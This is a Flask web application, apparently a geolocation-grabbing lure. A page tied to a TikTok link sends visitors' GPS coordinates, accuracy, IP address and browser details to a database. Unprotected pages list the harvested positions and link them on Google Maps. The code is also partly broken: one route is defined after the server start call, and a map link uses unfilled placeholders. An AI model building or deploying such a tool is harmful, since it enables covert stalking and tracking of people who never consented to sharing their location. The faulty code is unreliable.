from flask import Flask, request, jsonify, render_template
from datetime import datetime
import os
import psycopg2

app = Flask(__name__)
TARGET_TIKTOK = "https://vt.tiktok.com/ZSVY3uMuh/"

# Conexión a PostgreSQL
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgres://localhost:5432/locations')

def get_db():
    conn = psycopg2.connect(DATABASE_URL)
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS locations (
        id SERIAL PRIMARY KEY,
        timestamp TEXT,
        ip TEXT,
        user_agent TEXT,
        latitude REAL,
        longitude REAL,
        accuracy REAL,
        session_id TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return render_template('index.html', target_tiktok=TARGET_TIKTOK)

@app.route('/guardar-ubicacion', methods=['POST'])
def guardar_ubicacion():
    try:
        data = request.get_json(silent=True) or {}
        lat = data.get('latitud')
        lon = data.get('longitud')
        accuracy = data.get('precision')
        session_id = data.get('session_id', 'unknown')
        
        forwarded = request.headers.get('X-Forwarded-For', '')
        ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr or 'unknown'
        user_agent = request.headers.get('User-Agent', '')[:500]
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        conn = get_db()
        c = conn.cursor()
        c.execute("""INSERT INTO locations (timestamp, ip, user_agent, latitude, longitude, accuracy, session_id) 
                     VALUES (%s, %s, %s, %s, %s, %s, %s)""",
                  (now, ip, user_agent, lat, lon, accuracy, session_id))
        conn.commit()
        conn.close()
        
        print(f"[{now}] UBICACIÓN GUARDADA: IP={ip} | LAT={lat} | LON={lon} | PRECISIÓN={accuracy}m", flush=True)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"ERROR: {str(e)}", flush=True)
        return jsonify({"status": "error"}), 500

@app.route('/ver-ubicaciones')
def ver_ubicaciones():
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 50")
        locations = c.fetchall()
        conn.close()
        
        html = "<h1>Ubicaciones Registradas</h1><table border='1'><tr><th>ID</th><th>Fecha</th><th>IP</th><th>Lat</th><th>Lon</th><th>Precisión</th></tr>"
        for loc in locations:
            html += f"<tr><td>{loc[0]}</td><td>{loc[1]}</td><td>{loc[2]}</td><td>{loc[4]}</td><td>{loc[5]}</td><td>{loc[6]}m</td></tr>"
        html += "</table>"
        return html
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
@app.route('/mapa')
def mapa():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT latitude, longitude, timestamp FROM locations ORDER BY timestamp DESC LIMIT 20")
    locations = c.fetchall()
    conn.close()
    
    html = """<!DOCTYPE html>
    <html>
    <head>
        <title>Mapa de Ubicaciones</title>
        <style>
            body { font-family: sans-serif; margin: 20px; }
            iframe { width: 100%; height: 500px; border: none; }
        </style>
    </head>
    <body>
        <h1>Mapa de Ubicaciones</h1>
        <iframe src="https://maps.google.com/maps?q={lat},{lon}&z=15&output=embed"></iframe>
        <h2>Últimas ubicaciones:</h2>
        <ul>
    """
    for loc in locations:
        html += f"<li>{loc[2]} - <a href='https://maps.google.com/maps?q={loc[0]},{loc[1]}&z=15' target='_blank'>Ver en mapa</a></li>"
    
    html += "</ul></body></html>"
    return html
